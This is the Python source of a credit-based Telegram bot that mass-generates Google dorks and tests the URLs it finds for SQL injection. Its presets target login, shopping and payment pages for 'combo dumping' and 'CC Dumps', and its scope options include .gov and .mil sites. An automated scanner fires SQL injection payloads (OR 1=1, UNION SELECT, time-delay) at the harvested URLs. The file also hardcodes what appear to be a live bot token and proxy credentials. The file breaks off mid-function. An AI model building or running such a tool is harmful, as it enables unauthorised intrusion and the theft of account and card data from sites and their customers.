import io
import json
import os
import uuid
import random
import logging
import asyncio
import traceback
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, ContextTypes, MessageHandler,
    CommandHandler, CallbackQueryHandler, filters
)

# --- CONFIG ---
TELEGRAM_TOKEN = "7545064228:AAHYqBGcXGJpK1WUp68-uuLZjMjTiPEPb2o"
OXY_USER = "Pika1_MhRPr"
OXY_PASS = "Pika=1234pika"
OWNER_IDS = {7214730073, 8003049490}
DB_FILE = "users_db.json"
PARSER_THREADS = 5

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("AlephBot")

# ──────────────────────────────────────────────
#  DATABASE
# ──────────────────────────────────────────────

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db_data):
    with open(DB_FILE, 'w') as f:
        json.dump(db_data, f, indent=2)

def get_user(user_id):
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"credits": 0, "banned": False, "uses": 0}
        save_db(db)
    return db[uid]

db = load_db()
active_keys = {}
user_states = {}

# ──────────────────────────────────────────────
#  VISUAL HELPERS
# ──────────────────────────────────────────────

DIV = "─────────────────────────"

def pbar(done, total, width=12):
    filled = int(width * done / total) if total else 0
    bar = "█" * filled + "░" * (width - filled)
    pct = int(100 * done / total) if total else 0
    return f"`[{bar}]` {pct}%"

def esc(text):
    for ch in r'_*[]()~`>#+-=|{}.!':
        text = text.replace(ch, f'\\{ch}')
    return text

def back_kb(target='back_menu'):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️  Back to Menu", callback_data=target)]
    ])

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛠  Dork Generator", callback_data='mode_gen')],
        [InlineKeyboardButton("🔎  Deep Parser", callback_data='mode_parse')],
        [InlineKeyboardButton("💉  SQL Tester", callback_data='mode_sql')],
        [InlineKeyboardButton("💰  My Balance", callback_data='show_balance')],
        [InlineKeyboardButton("❓  Help", callback_data='show_help')],
    ])

COUNT_OPTIONS = [50, 100, 250, 500, 1000]

def count_kb(prefix):
    rows = []
    row = []
    for c in COUNT_OPTIONS:
        row.append(InlineKeyboardButton(str(c), callback_data=f"{prefix}_{c}"))
        if len(row) == 3:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    return rows

# ──────────────────────────────────────────────
#  PRESET TEMPLATES
# ──────────────────────────────────────────────

PRESET_COMBO = {
    "key": "combo",
    "label": "Site Targeted Combo",
    "icon": "🎯",
    "desc": "SQLi dorks targeting login/user databases for combo dumping",
    "templates": [
        'inurl:login.php?id= "{kw}"',
        'inurl:member.php?id= "{kw}"',
        'inurl:user.php?id= "{kw}"',
        'inurl:profile.php?id= "{kw}"',
        'inurl:account.php?id= "{kw}"',
        'inurl:index.php?id= "{kw}"',
        'inurl:view.php?id= "{kw}"',
        'inurl:detail.php?id= "{kw}"',
        'inurl:page.php?id= "{kw}"',
        'inurl:show.php?id= "{kw}"',
        'inurl:content.php?id= "{kw}"',
        'inurl:info.php?id= "{kw}"',
        'inurl:main.php?id= "{kw}"',
        'inurl:default.php?id= "{kw}"',
        'inurl:admin.php?id= "{kw}"',
        'inurl:login.asp?id= "{kw}"',
        'inurl:default.asp?id= "{kw}"',
        'inurl:user.aspx?id= "{kw}"',
        'inurl:users.php?id= "{kw}"',
        'inurl:customer.php?id= "{kw}"',
        'inurl:signup.php?id= "{kw}"',
        'inurl:register.php?id= "{kw}"',
        'inurl:auth.php?id= "{kw}"',
        'inurl:accounts.php?id= "{kw}"',
        'inurl:panel.php?id= "{kw}"',
        'inurl:dashboard.php?id= "{kw}"',
        'inurl:portal.php?id= "{kw}"',
        'inurl:members.php?id= "{kw}"',
        'inurl:subscriber.php?id= "{kw}"',
        'inurl:manage.php?id= "{kw}"',
        'inurl:.php?user_id= "{kw}"',
        'inurl:.php?uid= "{kw}"',
        'inurl:.php?member_id= "{kw}"',
        'inurl:.php?account_id= "{kw}"',
        'inurl:.php?login_id= "{kw}"',
    ],
}

PRESET_SHOPPING = {
    "key": "shopping",
    "label": "Shopping SQLi",
    "icon": "🛒",
    "desc": "SQLi dorks targeting e-commerce sites for order/account dumping",
    "templates": [
        'inurl:product.php?id= "{kw}"',
        'inurl:item.php?id= "{kw}"',
        'inurl:shop.php?id= "{kw}"',
        'inurl:store.php?id= "{kw}"',
        'inurl:buy.php?id= "{kw}"',
        'inurl:cart.php?id= "{kw}"',
        'inurl:order.php?id= "{kw}"',
        'inurl:checkout.php?id= "{kw}"',
        'inurl:catalog.php?id= "{kw}"',
        'inurl:category.php?id= "{kw}"',
        'inurl:products.php?cat= "{kw}"',
        'inurl:goods.php?id= "{kw}"',
        'inurl:productdetail.php?id= "{kw}"',
        'inurl:product_detail.php?id= "{kw}"',
        'inurl:product-detail.php?id= "{kw}"',
        'inurl:view_product.php?id= "{kw}"',
        'inurl:item_detail.php?id= "{kw}"',
        'inurl:shopping.php?id= "{kw}"',
        'inurl:basket.php?id= "{kw}"',
        'inurl:invoice.php?id= "{kw}"',
        'inurl:wishlist.php?id= "{kw}"',
        'inurl:purchase.php?id= "{kw}"',
        'inurl:listing.php?id= "{kw}"',
        'inurl:offer.php?id= "{kw}"',
        'inurl:deal.php?id= "{kw}"',
        'inurl:price.php?id= "{kw}"',
        'inurl:.php?product_id= "{kw}"',
        'inurl:.php?item_id= "{kw}"',
        'inurl:.php?cat_id= "{kw}"',
        'inurl:.php?category_id= "{kw}"',
        'inurl:.php?order_id= "{kw}"',
        'inurl:.php?shop_id= "{kw}"',
        'inurl:.php?pid= "{kw}"',
        'inurl:.php?prod= "{kw}"',
        'inurl:.php?goods_id= "{kw}"',
    ],
}

PRESET_CC = {
    "key": "cc",
    "label": "CC / Payment SQLi",
    "icon": "💳",
    "desc": "SQLi dorks targeting payment gateways & billing systems",
    "templates": [
        'inurl:payment.php?id= "{kw}"',
        'inurl:billing.php?id= "{kw}"',
        'inurl:pay.php?id= "{kw}"',
        'inurl:transaction.php?id= "{kw}"',
        'inurl:checkout.php?id= "{kw}"',
        'inurl:receipt.php?id= "{kw}"',
        'inurl:donate.php?id= "{kw}"',
        'inurl:subscription.php?id= "{kw}"',
        'inurl:gateway.php?id= "{kw}"',
        'inurl:process.php?id= "{kw}"',
        'inurl:charge.php?id= "{kw}"',
        'inurl:transfer.php?id= "{kw}"',
        'inurl:wallet.php?id= "{kw}"',
        'inurl:refund.php?id= "{kw}"',
        'inurl:confirm.php?id= "{kw}"',
        'inurl:paymentinfo.php?id= "{kw}"',
        'inurl:payment_detail.php?id= "{kw}"',
        'inurl:order_payment.php?id= "{kw}"',
        'inurl:booking.php?id= "{kw}"',
        'inurl:reserve.php?id= "{kw}"',
        'inurl:plan.php?id= "{kw}"',
        'inurl:invoice.php?id= "{kw}"',
        'inurl:topup.php?id= "{kw}"',
        'inurl:recharge.php?id= "{kw}"',
        'inurl:deposit.php?id= "{kw}"',
        'inurl:.php?payment_id= "{kw}"',
        'inurl:.php?transaction_id= "{kw}"',
        'inurl:.php?billing_id= "{kw}"',
        'inurl:.php?invoice_id= "{kw}"',
        'inurl:.php?receipt_id= "{kw}"',
        'inurl:.php?booking_id= "{kw}"',
        'inurl:.php?order_id= "{kw}"',
        'inurl:.php?plan_id= "{kw}"',
        'inurl:.php?sub_id= "{kw}"',
        'inurl:.php?pay_id= "{kw}"',
    ],
}

PRESETS = {
    "combo": PRESET_COMBO,
    "shopping": PRESET_SHOPPING,
    "cc": PRESET_CC,
}

# ──────────────────────────────────────────────
#  CUSTOM BUILDER TEMPLATES (existing)
# ──────────────────────────────────────────────

DORK_CATEGORIES = {
    "sensitive": {
        "label": "Sensitive Files", "icon": "📄",
        "templates": [
            'filetype:sql "{kw}"', 'filetype:env "{kw}"',
            'filetype:log "{kw}"', 'filetype:cfg "{kw}"',
            'filetype:bak "{kw}"', 'filetype:old "{kw}"',
            'filetype:txt "{kw}" "password"', 'filetype:csv "{kw}" "email"',
            'filetype:xls "{kw}" "password"', 'filetype:conf "{kw}"',
            'filetype:ini "{kw}"', 'extension:yml "{kw}" "password"',
        ],
    },
    "login": {
        "label": "Login Pages", "icon": "🔐",
        "templates": [
            'inurl:admin/login "{kw}"', 'inurl:admin/login.php "{kw}"',
            'inurl:admin/login.asp "{kw}"', 'inurl:user/login "{kw}"',
            'inurl:signin "{kw}"', 'inurl:wp-login.php "{kw}"',
            'intitle:"admin panel" "{kw}"', 'intitle:"login" inurl:admin "{kw}"',
            'intitle:"dashboard" inurl:login "{kw}"', 'inurl:cpanel "{kw}"',
            'inurl:webmail "{kw}"', 'intitle:"sign in" "{kw}"',
        ],
    },
    "dirs": {
        "label": "Exposed Directories", "icon": "📂",
        "templates": [
            'intitle:"index of" "{kw}"', 'intitle:"index of /" "{kw}"',
            'intitle:"index of" "parent directory" "{kw}"',
            'intitle:"Index of" ".git" "{kw}"',
            'intitle:"index of" "backup" "{kw}"', 'intitle:"index of" ".env" "{kw}"',
            'intitle:"index of" "wp-content" "{kw}"',
            'intitle:"index of" "uploads" "{kw}"',
            'intitle:"index of" "config" "{kw}"',
            'intitle:"index of" "database" "{kw}"',
            'intitle:"index of" "private" "{kw}"',
            'intitle:"index of" "secret" "{kw}"',
        ],
    },
    "db": {
        "label": "Database Leaks", "icon": "🗄",
        "templates": [
            'filetype:sql "insert into" "{kw}"', 'filetype:sql "password" "{kw}"',
            'filetype:sql "CREATE TABLE" "{kw}"', 'intext:"DB_PASSWORD" "{kw}"',
            'intext:"DB_HOST" "{kw}"', 'intext:"mysql_connect" "{kw}"',
            'filetype:env "DB_PASSWORD" "{kw}"', 'filetype:env "DATABASE_URL" "{kw}"',
            'intext:"connectionString" filetype:config "{kw}"',
            'filetype:properties "jdbc" "{kw}"',
            'intext:"pg_connect" "{kw}"', 'filetype:sql "phpMyAdmin" "{kw}"',
        ],
    },
    "cloud": {
        "label": "Cloud Storage", "icon": "☁️",
        "templates": [
            'site:s3.amazonaws.com "{kw}"', 'site:blob.core.windows.net "{kw}"',
            'site:storage.googleapis.com "{kw}"', 'site:firebaseio.com "{kw}"',
            'site:digitaloceanspaces.com "{kw}"', 'inurl:s3.amazonaws.com "{kw}"',
            'inurl:storage.cloud.google.com "{kw}"', 'site:drive.google.com "{kw}"',
            'site:docs.google.com "{kw}"', 'site:amazonaws.com filetype:pdf "{kw}"',
            'site:firebasestorage.googleapis.com "{kw}"',
            'inurl:dropbox.com/s/ "{kw}"',
        ],
    },
    "api": {
        "label": "API Keys & Secrets", "icon": "🔑",
        "templates": [
            'extension:json "api_key" "{kw}"', 'extension:json "apikey" "{kw}"',
            'extension:json "secret" "{kw}"', 'filetype:env "API_KEY" "{kw}"',
            'filetype:env "SECRET_KEY" "{kw}"', 'filetype:env "AWS_ACCESS" "{kw}"',
            'intext:"PRIVATE KEY" filetype:key "{kw}"',
            'filetype:pem "PRIVATE" "{kw}"', 'filetype:ppk "{kw}"',
            'intext:"api_secret" "{kw}"', 'filetype:json "client_secret" "{kw}"',
            'filetype:yaml "apiKey" "{kw}"',
        ],
    },
    "all": {"label": "All Types", "icon": "🌐", "templates": []},
}

SITE_TYPES = {
    "any":  {"label": "Any Site",   "icon": "🌐", "prefix": ""},
    "gov":  {"label": ".gov Sites", "icon": "🏛", "prefix": "site:*.gov "},
    "edu":  {"label": ".edu Sites", "icon": "🎓", "prefix": "site:*.edu "},
    "org":  {"label": ".org Sites", "icon": "🏢", "prefix": "site:*.org "},
    "com":  {"label": ".com Sites", "icon": "💼", "prefix": "site:*.com "},
    "mil":  {"label": ".mil Sites", "icon": "🎖", "prefix": "site:*.mil "},
}

PAGE_PARAMS = {
    "inurl": {
        "label": "URL Parameters", "icon": "🔗",
        "extra": [
            'inurl:php?id= "{kw}"', 'inurl:asp?id= "{kw}"',
            'inurl:page= "{kw}"', 'inurl:cat= "{kw}"',
            'inurl:item= "{kw}"', 'inurl:view= "{kw}"',
            'inurl:product= "{kw}"', 'inurl:file= "{kw}"',
            'inurl:download= "{kw}"', 'inurl:action= "{kw}"',
        ],
    },
    "filetype": {
        "label": "File Types", "icon": "📎",
        "extra": [
            'filetype:pdf "{kw}"', 'filetype:doc "{kw}"',
            'filetype:docx "{kw}"', 'filetype:ppt "{kw}"',
            'filetype:xlsx "{kw}"', 'filetype:xml "{kw}"',
            'filetype:json "{kw}"', 'filetype:txt "{kw}"',
        ],
    },
    "intitle": {
        "label": "Page Titles", "icon": "📰",
        "extra": [
            'intitle:"{kw}"', 'intitle:"{kw}" "admin"',
            'intitle:"{kw}" "login"', 'intitle:"{kw}" "dashboard"',
            'intitle:"{kw}" "config"', 'intitle:"{kw}" "error"',
            'allintitle:"{kw}" password',
        ],
    },
    "intext": {
        "label": "Page Content", "icon": "📝",
        "extra": [
            'intext:"{kw}"', 'intext:"{kw}" "password"',
            'intext:"{kw}" "username"', 'intext:"{kw}" "secret"',
            'allintext:"{kw}" "confidential"', 'allintext:"{kw}" "internal"',
        ],
    },
    "none": {"label": "No Extra Params", "icon": "➖", "extra": []},
}

# ──────────────────────────────────────────────
#  DORK BUILDING
# ──────────────────────────────────────────────

def build_preset_dorks(keywords, preset_key, max_count):
    preset = PRESETS.get(preset_key)
    if not preset:
        return []
    templates = preset["templates"]
    seen = set()
    all_dorks = []
    for kw in keywords:
        for t in templates:
            dork = t.format(kw=kw)
            if dork not in seen:
                seen.add(dork)
                all_dorks.append(dork)
    if len(all_dorks) > max_count:
        random.shuffle(all_dorks)
        all_dorks = all_dorks[:max_count]
    return all_dorks

def build_custom_dorks(keywords, dork_type, site_type, page_param, max_count):
    templates = []
    if dork_type == "all":
        for key, cat in DORK_CATEGORIES.items():
            if key != "all":
                templates.extend(cat["templates"])
    else:
        templates.extend(DORK_CATEGORIES.get(dork_type, {}).get("templates", []))
    pp = PAGE_PARAMS.get(page_param, {})
    templates.extend(pp.get("extra", []))
    if not templates:
        templates = ['intitle:"index of" "{kw}"', 'filetype:sql "password" "{kw}"', 'inurl:php?id= "{kw}"']
    site_prefix = SITE_TYPES.get(site_type, {}).get("prefix", "")
    seen = set()
    all_dorks = []
    for kw in keywords:
        for t in templates:
            dork = site_prefix + t.format(kw=kw)
            if dork not in seen:
                seen.add(dork)
                all_dorks.append(dork)
    if len(all_dorks) > max_count:
        random.shuffle(all_dorks)
        all_dorks = all_dorks[:max_count]
    return all_dorks

# ──────────────────────────────────────────────
#  SQL SCANNER
# ──────────────────────────────────────────────

SQL_PAYLOADS = [
    "'", "''", "`", "\"", "')", "'))", "')))", "\";",
    " order by 10--", " union select 1,2,3,4,5,6--",
    " OR 1=1--", "admin' --", "' OR 'a'='a",
    " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    " %' OR '1'='1", "';", "\\", "%27",
    "WAITFOR DELAY '0:0:5'--", "OR 1=1#", "') OR ('1'='1"
]

SQL_ERRORS = [
    "SQL syntax", "mysql_fetch_array", "MySQL Error", "PostgreSQL",
    "Microsoft OLE DB Provider for SQL Server", "JDBC Driver",
    "SQLite/JDBCDriver", "System.Data.SqlClient.SqlException",
    "Invision Power Board Database Error", "Warning: mysql_connect()",
    "Driver [pdo_mysql]", "ORA-00933", "Syntax error in SQL statement",
    "Dynamic SQL Error", "valid MySQL result",
    "Unclosed quotation mark after the character string",
    "pg_query(): Query failed", "SQLITE_ERROR",
    "Warning: pg_exec()", "supplied argument is not a valid MySQL"
]

async def check_sql(session, url):
    if "?" not in url:
        return None
    base_part = url.split("?")[0]
    params = url.split("?")[1].split("&")
    tasks = []
    for payload in SQL_PAYLOADS:
        for i in range(len(params)):
            new_params = list(params)
            new_params[i] += payload
            test_url = f"{base_part}?{'&'.join(new_params)}"
            tasks.append(_sql_test(session, test_url))
    results = await asyncio.gather(*tasks)
    return next((r for r in results if r), None)

async def _sql_test(session, test_url):
    try:
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
            body = await resp.text()
            if any(e.lower() in body.lower() for e in SQL_ERRORS):
                return f"[VULN] {test_url}"
    except Exception:
        pass
    return None

# ──────────────────────────────────────────────
#  GOOGLE PARSER (5-thread semaphore)
# ──────────────────────────────────────────────

parser_semaphore = asyncio.Semaphore(PARSER_THREADS)

async def fetch_oxylabs(session, query):
    async with parser_semaphore:
        url = "https://realtime.oxylabs.io/v1/queries"
        payload = {
            "source": "google_search", "query": query,
            "user_agent_type": "desktop_chrome", "parse": True,
            "start_page": 1, "pages": 10, "limit": 50,
        }
        logger.info("PARSER [thread] query: %.100s", query)
        try:
            async with session.post(
                url, auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
                json=payload, timeout=aiohttp.ClientTimeout(total=90),
            ) as r:
                body_text = await r.text()
                if r.status != 200:
                    logger.error("PARSER HTTP %d: %.80s — %.300s", r.status, query, body_text)
                    return []
                try:
                    data = json.loads(body_text)
                except json.JSONDecodeError as je:
                    logger.error("PARSER JSON err: %s", je)
                    return []
                urls = []
                for page in data.get("results", []):
                    organic = page.get("content", {}).get("results", {}).get("organic", [])
                    for item in organic:
                        u = item.get("url")
                        if u:
                            urls.append(u)
                logger.info("PARSER got %d URLs: %.80s", len(urls), query)
                return urls
        except asyncio.TimeoutError:
            logger.error("PARSER timeout: %.100s", query)
            return []
        except aiohttp.ClientError as e:
            logger.error("PARSER net err: %s — %s", query, e)
            return []
        except Exception as e:
            logger.error("PARSER err: %s\n%s", e, traceback.format_exc())
            return []

# ──────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────

def is_banned(uid):
    return db.get(str(uid), {}).get("banned", False)

# ──────────────────────────────────────────────
#  STATIC TEXTS
# ──────────────────────────────────────────────

WELCOME = (
    "🌐 *Aleph Null — Sovereign Engine*\n"
    f"{DIV}\n\n"
    "Welcome\\! Pick a module to get started\\.\n\n"
    "📌 *Quick Start:*\n"
    "  1️⃣  Choose a mode\n"
    "  2️⃣  Follow the steps\n"
    "  3️⃣  Get your results\\!\n\n"
    f"{DIV}"
)

HELP = (
    "❓ *How to Use This Bot*\n"
    f"{DIV}\n\n"
    "🛠 *Dork Generator*\n"
    "  Two ways to generate:\n\n"
    "  *Quick Presets* \\(1\\-click setup\\):\n"
    "  🎯 Site Targeted Combo\n"
    "  🛒 Shopping Combos\n"
    "  💳 CC Dumps\n"
    "  → Just pick preset, set count, send keywords\\!\n\n"
    "  *Custom Builder* \\(full control\\):\n"
    "  ① Pick Dork Type\n"
    "  ② Pick Site Scope\n"
    "  ③ Pick Page Params\n"
    "  ④ Set count, send keywords\n\n"
    "🔎 *Deep Parser*  \\(5 credits/dork\\)\n"
    "  Scrapes Google with 5 concurrent threads\\.\n"
    "  → Send dorks as text or \\.txt file\\.\n\n"
    "💉 *SQL Tester*  \\(5 credits/URL\\)\n"
    "  Tests URLs for SQL injection\\.\n"
    "  → Send URLs as text or \\.txt file\\.\n\n"
    f"{DIV}\n"
    "📝 *Commands:*\n"
    "  /start — Main menu\n"
    "  /menu  — Back to menu\n"
    "  /help  — This guide\n"
    "  /balance — Check credits\n"
    "  /redeem `KEY` — Add credits\n"
)

# ──────────────────────────────────────────────
#  COMMAND HANDLERS
# ──────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    get_user(update.effective_user.id)
    await update.message.reply_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    await update.message.reply_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    await update.message.reply_text(HELP, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    ud = get_user(update.effective_user.id)
    text = (
        f"💰 *Your Balance*\n{DIV}\n\n"
        f"   Credits: `{ud.get('credits',0)}`\n"
        f"   Uses: `{ud.get('uses',0)}`\n\n"
        f"Use /redeem `KEY` to add credits\\."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text(
            "📝 *Usage:* `/redeem YOUR\\-KEY`\n\nExample: `/redeem ALEPH\\-A1B2C3D4`",
            parse_mode=ParseMode.MARKDOWN_V2)
        return
    uid = str(update.effective_user.id)
    key = context.args[0].upper()
    if key in active_keys:
        val = active_keys.pop(key)
        ud = get_user(uid)
        ud["credits"] = ud.get("credits", 0) + val
        db[uid] = ud; save_db(db)
        await update.message.reply_text(
            f"✅ *Key Redeemed\\!*\n\n   \\+`{val}` credits\n   Balance: `{ud['credits']}`",
            parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("❌ *Invalid or expired key\\.*", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /ban USER\\_ID", parse_mode=ParseMode.MARKDOWN_V2); return
    tid = str(context.args[0])
    db[tid] = {"credits": 0, "banned": True}; save_db(db)
    await update.message.reply_text(f"🚫 User `{tid}` banned\\.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /key AMOUNT"); return
    try:
        val = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Amount must be a number\\."); return
    key = f"ALEPH-{uuid.uuid4().hex[:8].upper()}"
    active_keys[key] = val
    await update.message.reply_text(
        f"🔑 *New Key*\n\n   Key: `{key}`\n   Credits: `{val}`",
        parse_mode=ParseMode.MARKDOWN_V2)

# ──────────────────────────────────────────────
#  BUTTON HANDLER
# ──────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if is_banned(uid): return
    await q.answer()
    data = q.data

    # ── Navigation ──
    if data == 'back_menu':
        user_states.pop(uid, None)
        await q.edit_message_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data == 'show_balance':
        ud = get_user(uid)
        text = (
            f"💰 *Your Balance*\n{DIV}\n\n"
            f"   Credits: `{ud.get('credits',0)}`\n"
            f"   Uses: `{ud.get('uses',0)}`\n\n"
            f"Use /redeem `KEY` to add credits\\."
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    if data == 'show_help':
        await q.edit_message_text(HELP, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ── Mode: Parser ──
    if data == 'mode_parse':
        user_states[uid] = {"mode": "PARSER"}
        ud = get_user(uid)
        text = (
            f"🔎 *Deep Parser*\n{DIV}\n\n"
            f"Send me your *dorks* and I'll scrape\n"
            f"Google results using `{PARSER_THREADS}` threads\\.\n\n"
            f"📝 *How to send:*\n"
            f"• Type dorks below \\(one per line\\)\n"
            f"• Or upload a `.txt` file\n\n"
            f"💡 _Example:_\n"
            f"`inurl:php?id=`\n"
            f"`filetype:sql password`\n\n"
            f"💰 Cost: `5` credits/dork\n"
            f"💰 Balance: `{ud.get('credits',0)}`\n"
            f"⚡ Threads: `{PARSER_THREADS}` concurrent"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ── Mode: SQL ──
    if data == 'mode_sql':
        user_states[uid] = {"mode": "SQL"}
        ud = get_user(uid)
        text = (
            f"💉 *SQL Tester*\n{DIV}\n\n"
            f"Send me *URLs with parameters* and I'll\n"
            f"test each one for SQL injection\\.\n\n"
            f"📝 *How to send:*\n"
            f"• Type URLs below \\(one per line\\)\n"
            f"• Or upload a `.txt` file\n\n"
            f"💡 _Example:_\n"
            f"`http://example.com/page.php?id=1`\n\n"
            f"💰 Cost: `5` credits/URL\n"
            f"💰 Balance: `{ud.get('credits',0)}`"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ══════════════════════════════════════════
    #  GENERATOR — MAIN MENU (presets + custom)
    # ══════════════════════════════════════════
    if data == 'mode_gen':
        user_states[uid] = {"mode": "GENERATOR", "step": "choose_type"}
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎯  Site Targeted Combo", callback_data='preset_combo')],
            [InlineKeyboardButton("🛒  Shopping Combos", callback_data='preset_shopping')],
            [InlineKeyboardButton("💳  CC Dumps", callback_data='preset_cc')],
            [InlineKeyboardButton(f"{DIV}", callback_data='_noop')],
            [InlineKeyboardButton("🛠  Custom Builder", callback_data='custom_start')],
            [InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')],
        ])
        text = (
            f"🛠 *Dork Generator*\n{DIV}\n\n"
            f"Choose a *quick preset* or build custom:\n\n"
            f"🎯 *Site Targeted Combo*\n"
            f"   _SQLi dorks for login/user DB dumping_\n\n"
            f"🛒 *Shopping SQLi*\n"
            f"   _SQLi dorks for e\\-commerce/order dumping_\n\n"
            f"💳 *CC / Payment SQLi*\n"
            f"   _SQLi dorks for payment/billing systems_\n\n"
            f"{DIV}\n"
            f"🛠 *Custom Builder*\n"
            f"   _Full control over dork type, site, params_"
        )
        await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data == '_noop':
        return

    # ══════════════════════════════════════════
    #  PRESETS — pick count
    # ══════════════════════════════════════════
    if data.startswith('preset_'):
        preset_key = data.replace('preset_', '')
        preset = PRESETS.get(preset_key)
        if not preset:
            return
        user_states[uid] = {
            "mode": "GENERATOR", "step": "preset_count",
            "gen_type": "preset", "preset": preset_key,
        }
        rows = count_kb(f"pcount_{preset_key}")
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='mode_gen')])
        text = (
            f"{preset['icon']} *{esc(preset['label'])}*\n{DIV}\n\n"
            f"_{esc(preset['desc'])}_\n\n"
            f"⚙️ *Auto\\-configured settings:*\n"
            f"   Templates: `{len(preset['templates'])}` patterns\n"
            f"   Site scope: 🌐 Any\n"
            f"   Parameters: auto\n\n"
            f"📊 *How many dorks* do you want to generate?\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Preset — count selected → ask keywords ──
    if data.startswith('pcount_'):
        parts = data.split('_')
        preset_key = parts[1]
        max_count = int(parts[2])
        preset = PRESETS.get(preset_key, {})
        st = user_states.get(uid, {})
        st.update({"step": "keywords", "max_count": max_count})
        user_states[uid] = st
        bk = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️  Change Count", callback_data=f"preset_{preset_key}")],
            [InlineKeyboardButton("⬅️  Back to Generator", callback_data='mode_gen')],
        ])
        text = (
            f"{preset.get('icon','')} *{esc(preset.get('label',''))}*\n{DIV}\n\n"
            f"   Templates: `{len(preset.get('templates',[]))}` patterns\n"
            f"   Max dorks: `{max_count}`\n\n"
            f"✏️ Now send me your *keywords*\n"
            f"\\(one per line, or upload a \\.txt file\\)\n\n"
            f"💡 _Example — just type:_\n"
            f"`netflix`\n`spotify`\n`amazon`\n\n"
            f"🆓 This is *free* — no credits needed\\!"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
        return

    # ══════════════════════════════════════════
    #  CUSTOM BUILDER — Step 1: Dork Type
    # ══════════════════════════════════════════
    if data == 'custom_start':
        user_states[uid] = {"mode": "GENERATOR", "step": "cust_dtype", "gen_type": "custom"}
        rows = []
        for key, cat in DORK_CATEGORIES.items():
            rows.append([InlineKeyboardButton(
                f"{cat['icon']}  {cat['label']}", callback_data=f"cdtype_{key}"
            )])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='mode_gen')])
        text = (
            f"🛠 *Custom Builder — Step 1/4*\n{DIV}\n\n"
            f"Choose the *type of dorks*:\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Custom Step 2: Site Type ──
    if data.startswith("cdtype_"):
        dtype = data.replace("cdtype_", "")
        st = user_states.get(uid, {})
        st.update({"step": "cust_site", "dork_type": dtype})
        user_states[uid] = st
        cat = DORK_CATEGORIES.get(dtype, {})
        rows = []
        for key, site in SITE_TYPES.items():
            rows.append([InlineKeyboardButton(
                f"{site['icon']}  {site['label']}", callback_data=f"csite_{key}"
            )])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='custom_start')])
        text = (
            f"🛠 *Custom Builder — Step 2/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n\n"
            f"Choose the *site scope*:\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Custom Step 3: Page Params ──
    if data.startswith("csite_"):
        stype = data.replace("csite_", "")
        st = user_states.get(uid, {})
        st.update({"step": "cust_param", "site_type": stype})
        user_states[uid] = st
        dtype = st.get("dork_type", "all")
        cat = DORK_CATEGORIES.get(dtype, {})
        site = SITE_TYPES.get(stype, {})
        rows = []
        for key, pp in PAGE_PARAMS.items():
